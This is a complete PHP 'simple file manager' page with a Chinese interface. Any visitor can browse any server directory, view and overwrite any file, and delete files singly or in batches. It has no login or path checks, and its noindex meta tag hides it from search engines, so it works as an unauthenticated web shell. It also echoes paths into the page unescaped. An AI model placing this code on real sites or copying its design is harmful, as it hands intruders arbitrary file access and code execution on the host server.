<?php
$action = isset($_GET['action']) ? $_GET['action'] : '';
$path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';
$title = $content = '';
switch($action){
    case 'batchDel':
        $title = '删除选中文件';
        $content = '<table cellspacing="0" cellpadding="0" border="0" class="table"><tr><td>文件名</td><td>操作</td></tr>';
        if(isset($_POST['files'])){
            foreach($_POST['files'] as $v){
                if(file_exists($v)){
                    if(unlink($v)){
                        $content .= '<tr><td>'.$v.'</td><td>删除成功</td></tr>';
                    }else{
                        $content .= '<tr><td><font color="red">'.$v.'</font></td><td>删除失败</td></tr>';
                    }
                }else{
                    $content .= '<tr><td>'.$v.'</td><td>删除成功</td></tr>';
                }
            }
            $content .= '</table>';
        }
    break;
    case 'del':
        $title = '删除文件';
        $content = '<table cellspacing="0" cellpadding="0" border="0" class="table"><tr><td>文件名</td><td>操作</td></tr><tr><td>'.$path.'</td><td>';
        if($path){
            if(file_exists($path)){
                if(unlink($path)){
                    $content .= 'Success';
                }else{
                    $content .= '<font color="red">Fail</font><br>';
                }
            }else{
                $content .= 'Success';
            }
        }
        $content .= '</td></tr></table>';
    break;
    case 'edit':
        $title = '查看/编辑 代码';
        $code = isset($_POST['code']) ? $_POST['code'] : '';
        if($code){
            if(file_exists($path)){
                $result = file_put_contents($path, $code);
                if($result){
                    $content = '编辑成功';
                }else{
                    chmod($path, 0644);
                    $temp = file_put_contents($path, $code);
                    if($temp){
                        $content = '修改权限后，编辑成功。';
                    }else{
                        $content = '修改权限后，编辑也失败。';
                    }
                }                
            }else{
                $content = '文件不存在，编辑失败。';
            }
        }else{
            $content = '<form action="?action=edit" method="post"><input type="hidden" name="path" value="'.htmlspecialchars($path).'"><div class="form-item form-text"><label class="form-label">内容</label><div class="input-block"><textarea name="code" class="form-textarea" style="min-height:500px;">'.htmlspecialchars(file_get_contents(htmlspecialchars($path))).'</textarea></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }        
    break;
    default:
        $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
        $dir = __DIR__;
        if($path){$dir = $path;}
        $title = $dir;
        $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td><td align="center">操作</td></tr></thead>';
        foreach(hardScandir($dir) as $value){
            $fullPath = str_replace('//', '/', $dir."/".$value);
            if($value != '.' && $value != '..' && is_dir($fullPath)){                
                $content .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'" target="_blank">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">文件夹</td><td align="center"></td></tr>';
            }
        }
        foreach(hardScandir($dir) as $value){
            $fullPath = str_replace('//', '/', $dir."/".$value);
            if($value != '.' && $value != '..' && !is_dir($fullPath)){
                $content .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'&action=edit" target="_blank">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">'.round(filesize($fullPath) / 1024, 2).' Kb</td><td align="center"><a href="?path='.escape($fullPath).'&action=del">删除</a></td></tr>';
            }
        }
        $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value="Delete Checked" onclick="return del();"></td></tr></table></form>';
    break;
}
function hardScandir($dir){
    if(function_exists("scandir")){
        return scandir($dir);
    }else{
        $dh = opendir($dir);
        while(false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function escape($uri){
    return str_replace('%2F', '/', rawurlencode($uri));
}?>
<!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Simple File Manage Design by index.php</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
body{font-size:16px;color:#000;font-sans-serif: system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";}a{text-decoration:none;}*{padding:0;margin:0;list-style:none;}.fa{padding-right:10px;}.submit{background-color:#1e9fff;vertical-align:middle;
    height: 38px;line-height: 38px;text-align:center;padding:0 18px;color:#FFF;border-radius:5px;cursor: pointer;}.border-none{border:none !important;}
.container{width: 95%;margin: 0 auto;}
fieldset{display: block;margin-inline-start: 2px;margin-inline-end: 2px;padding-block-start: 0.35em;padding-inline-start: 0.75em;padding-inline-end: 0.75em;padding-block-end: 0.625em;min-inline-size: min-content;border-width: 2px;border-style: groove;border-color: rgb(192, 192, 192);border-image: initial;}
legend{display:block;padding-inline-start: 2px;padding-inline-end: 2px;border-width: initial;border-style: none;border-color: initial;border-image: initial;margin-left: 20px;
    padding:0 10px;font-size:20px;font-weight:300;}
.field-title{margin:27px 0 20px;border-width:0;border-top-width:1px;}
.table{border-collapse:collapse;border-spacing:0;overflow:scroll;width:100%;}
.table td{word-break:break-all;max-width:300px;background-color:#FFF;}
.table th, .table td{border: 1px solid #ddd;padding:8px;}
.table tbody > tr:hover{background-color:#ccffcc;}
.table tbody > tr:hover td{background:none;}
.form-item{margin-bottom:15px;clear:both;border:1px solid #eee;}
.form-label{position:relative;float:left;display:block;padding:9px 15px;width:80px;font-weight:400;line-height:20px;text-align:right;background-color:#fafafa;}
.form-text .form-label{float: none;width: 100%;border-radius: 2px;box-sizing: border-box;text-align: left;}
.input-block{position:relative;margin-left:110px;min-height:36px;}
.form-text .input-block{margin: 0;left: 0;top: -1px;}
.form-input{display:block;padding-left:10px;width:50%;height:38px;line-height:1.3;line-height:38px\9;border:none;}
.form-text .form-textarea{position:relative;width: 90%;min-height: 100px;height:auto;line-height:20px;border-radius: 0 0 2px 2px;padding: 6px 10px;resize: vertical;border: none;}
.form-radio{margin:12px 0 0 12px;}
</style>
<script type="text/javascript">
function sa(form){ for(var i = 0;i < form.elements.length;i++){var e = form.elements[i];if(e.type == 'checkbox'){if(e.name != 'chkall'){e.checked = form.chkall.checked;}}}}
function del(){if(confirm("Are you sure?")){return true;}else{return false;}}
</script>
</head>
<body>
<div class="container">
    <fieldset class="field-title">
        <legend><?php echo $title;?></legend>
    </fieldset>
    <?php echo $content;?>
</div>
</body>
</html>